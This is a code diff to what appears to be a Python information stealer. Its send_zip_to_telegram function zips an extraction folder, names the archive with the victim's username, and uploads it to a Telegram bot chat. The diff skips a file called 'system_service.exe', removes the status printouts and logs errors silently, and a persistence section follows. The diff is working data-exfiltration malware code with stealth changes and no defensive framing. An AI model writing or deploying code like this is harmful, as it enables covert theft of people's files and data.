@@ -286,19 +286,30 @@ import datetime
 def send_zip_to_telegram():
     try:
         zip_name = f"{getpass.getuser()}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}"
-        zip_path = shutil.make_archive(zip_name, "zip", EXTRACT_FOLDER)
+        zip_path = f"{zip_name}.zip"
+
+        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+            for root, dirs, files in os.walk(EXTRACT_FOLDER):
+                for file in files:
+                    if file == "system_service.exe":
+                        continue  # ❌ Skip the EXE
+                    file_path = os.path.join(root, file)
+                    arcname = os.path.relpath(file_path, EXTRACT_FOLDER)
+                    zipf.write(file_path, arcname)
 
         with open(zip_path, "rb") as f:
-            response = requests.post(
+            requests.post(
                 f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                 data={"chat_id": CHAT_ID},
                 files={"document": (os.path.basename(zip_path), f)}
             )
 
         os.remove(zip_path)
-        print("[+] Data sent to Telegram.")
+
     except Exception as e:
-        print(f"[!] Telegram send failed: {e}")
+        with open(os.path.join(EXTRACT_FOLDER, "telegram_error.txt"), "w") as errlog:
+            errlog.write(str(e))
+
 
 
 # === PERSISTENCE ===
